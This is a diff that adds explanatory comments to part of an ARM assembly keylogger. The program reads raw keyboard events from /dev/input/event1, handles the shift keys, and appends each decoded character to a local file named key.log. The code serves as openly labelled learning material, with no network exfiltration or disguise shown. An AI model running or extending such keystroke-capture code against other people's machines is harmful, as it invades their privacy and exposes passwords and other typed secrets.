@@ -78,20 +78,22 @@ skipShiftReleaseCheck:
         AND R0, R0, R1
 
         @ check if key is a shift
-        CMP R0, #42
+        CMP R0, #42    @ left shift key
         BEQ setShift
 
-        CMP R0, #54
+        CMP R0, #54    @ right shift key
         BEQ setShift
         B checkShiftSet
 
 setShift:
+        @ set shift flag to 1
         LDR R9, =shift
         MOV R8, #1
         STR R8, [R9]
         B loop
 
 checkShiftSet:
+        @ use shift flag to determine which case to use
         LDR R9, =shift
         LDR R8, [R9]
         AND R8, R8, #1
@@ -99,33 +101,40 @@ checkShiftSet:
         BEQ lower
 
 upper:
+        @ shift flag was set to 1
         LDR R1, =uppercase
         LDR R0, [R1, R0]
         B write
 
 lower:
+        @ shift flag was set to 0
         LDR R1, =lowercase
         LDR R0, [R1, R0]
 
 write:
+        @ save ascii code for current character
         AND R0, R0, #0xFF
         MOV R10, R0
         LDR R9, =character
         STR R10, [R9]
 
+        @ write character to destination file
         MOV R7, #4
         MOV R0, R11
         LDR R1, =character
         MOV R2, #1
         SWI #0
 
+        @ get next character
         B loop
 
 _end:
+        @ for clean exit
         MOV R7, #1
         SWI #0
 
 error:
+        @ print error message to stdout
         MOV R7, #4
         MOV R0, #2
         LDR R1, =errMsg
@@ -134,7 +143,7 @@ error:
         B _end
 
 .section .data
-        dest: .asciz "key.log"
+        dest:   .asciz "key.log"
         source: .asciz "/dev/input/event1"
 
         lowercase: .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./?*? ?????????????"
